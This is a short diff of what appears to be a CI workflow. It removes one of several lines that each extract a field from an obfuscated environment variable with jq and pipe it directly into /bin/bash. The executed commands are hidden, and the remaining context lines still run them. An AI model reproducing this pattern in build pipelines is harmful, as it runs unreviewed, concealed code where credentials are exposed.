@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$jy4880" | jq -r .ar5511 | /bin/bash
           echo $jeld9 | jq -r .lc53 | /bin/bash
           echo $vccc1562 | jq -r .hpki36 | /bin/bash
-          echo $xif0830 | jq -r .kn04755 | /bin/bash
           echo $u30560 | jq -r .fnas15 | /bin/bash
           echo $vtjsg929 | jq -r .wkpm7627 | /bin/bash
 
